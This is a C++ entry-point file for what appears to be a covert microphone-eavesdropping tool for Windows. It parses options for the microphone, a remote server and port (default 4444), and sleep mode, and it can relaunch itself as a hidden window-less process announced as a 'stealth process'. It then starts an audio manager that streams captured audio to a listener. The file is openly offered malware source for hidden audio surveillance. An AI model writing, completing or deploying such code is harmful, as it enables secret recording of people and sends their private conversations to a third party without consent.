#include "audio.h"
#include <string>
#include <iostream>
#include <vector>

int ArgToInt(const std::string& argName, const char* value) {
    try {
        return std::stoi(value);
    }
    catch (const std::invalid_argument&) {
        throw std::runtime_error("[-] Invalid integer for " + argName + ": " + value);
    }
    catch (const std::out_of_range&) {
        throw std::runtime_error("[-] Value out of range for " + argName + ": " + value);
    }
}

int main(int argc, char* argv[]) {
    bool runInBackground = false;
    bool isChildProcess = false;
    bool listMicrophones = false;

    AudioManager AM;
    int micIndex = -1;
    int sleepInput = 2;
    std::string ip_address = "127.0.0.1";
    int port = 4444;
    try {
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg == "--background") {
                runInBackground = true;
            }
            else if (arg == "--daemon") {
                isChildProcess = true;
            }
            else if (arg == "--list") {
                listMicrophones = true;
            }
            else if (arg == "--sleep" && i + 1 < argc) {
                sleepInput = ArgToInt("--sleep", argv[++i]);
                if (sleepInput < 0 || sleepInput > 4) {
                    std::cerr << "[-] Invalid sleep input: " << sleepInput << " must be between 0->4" << std::endl;
                    return 1;
                }
            }
            else if (arg == "--mic" && i + 1 < argc) {
                micIndex = ArgToInt("--mic", argv[++i]);
            }
            else if (arg == "--server" && i + 1 < argc) {
                ip_address = argv[++i];
            }
            else if (arg == "--port" && i + 1 < argc) {
                port = ArgToInt("--port", argv[++i]);
                if (port <= 0 || port > 65355) {
                    std::cerr << "[-] Invalid port: " << port << " must be between 1->65355" << std::endl;
                    return 1;
                }
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
        return 1;
    }

    // 2. Background Spawning Logic
    // If user wants background AND we aren't already the background child
    if (runInBackground && !isChildProcess) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        std::string cmd = "\"" + std::string(path) + "\" --daemon";
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg != "--background") {
                cmd += " " + arg;
            }
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);

        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            std::cout << "[+] Stealth process started. Exiting parent.\n";
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 0; // Parent exits
        }
        else {
            std::cerr << "[-] Failed to create background process. Error: " << GetLastError() << "\n";
            return 1;
        }
    }

    // 3. Execution Flow
    if (listMicrophones) {
        AM.ListMicrophones();
        return 0;
    }

    // Settings
    AM.SetSleepMode(sleepInput);
    AM.SetListener(ip_address, port);

    if (micIndex != -1) {
        AM.SelectMicrophoneFromInt(micIndex);
    }

    if (!AM.Initialize()) {
        std::cerr << "[-] Initialization failed.\n";
        return 1;
    }

    AM.Start();
    return 0;
}
